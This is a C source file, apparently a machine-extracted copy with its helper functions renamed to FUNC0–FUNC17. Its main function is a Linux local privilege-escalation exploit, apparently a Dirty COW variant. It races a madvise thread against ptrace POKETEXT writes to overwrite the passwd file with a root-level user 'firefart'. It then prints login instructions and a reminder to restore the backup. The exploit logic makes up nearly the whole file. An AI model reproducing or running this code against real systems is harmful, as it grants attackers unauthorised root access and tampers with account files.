#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct Userinfo {char* username; char* info; char* home_dir; char* shell; int /*<<< orphan*/  hash; scalar_t__ group_id; scalar_t__ user_id; } ;
struct TYPE_3__ {scalar_t__ st_size; } ;

/* Variables and functions */
 int /*<<< orphan*/  MAP_PRIVATE ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  PROT_READ ; 
 int /*<<< orphan*/  PTRACE_POKETEXT ; 
 int /*<<< orphan*/  PTRACE_TRACEME ; 
 int /*<<< orphan*/  SIGSTOP ; 
 char* backup_filename ; 
 int FUNC0 (char*,char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  f ; 
 char* filename ; 
 scalar_t__ FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,TYPE_1__*) ; 
 char* FUNC4 (struct Userinfo) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 char* FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  madviseThread ; 
 scalar_t__ map ; 
 scalar_t__ FUNC9 (int /*<<< orphan*/ *,scalar_t__,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (char*,int /*<<< orphan*/ ) ; 
 scalar_t__ pid ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 int /*<<< orphan*/  pth ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC14 (int /*<<< orphan*/ ,...) ; 
 TYPE_1__ st ; 
 int FUNC15 (char*) ; 
 int /*<<< orphan*/  FUNC16 (scalar_t__,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

int FUNC17(int argc, char *argv[])
{
  // backup file
  int ret = FUNC0(filename, backup_filename);
  if (ret != 0) {
    FUNC1(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    FUNC11("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = FUNC6("Please enter the new password: ");
  }

  user.hash = FUNC5(plaintext_pw);
  char *complete_passwd_line = FUNC4(user);
  FUNC11("Complete line:\n%s\n", complete_passwd_line);

  f = FUNC10(filename, O_RDONLY);
  FUNC3(f, &st);
  map = FUNC9(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  FUNC11("mmap: %lx\n",(unsigned long)map);
  pid = FUNC2();
  if(pid) {
    FUNC16(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=FUNC15(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += FUNC14(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    FUNC11("ptrace %d\n",c);
  }
  else {
    FUNC12(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    FUNC14(PTRACE_TRACEME);
    FUNC8(FUNC7(), SIGSTOP);
    FUNC13(pth,NULL);
  }

  FUNC11("Done! Check %s to see if the new user was created.\n", filename);
  FUNC11("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    FUNC11("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}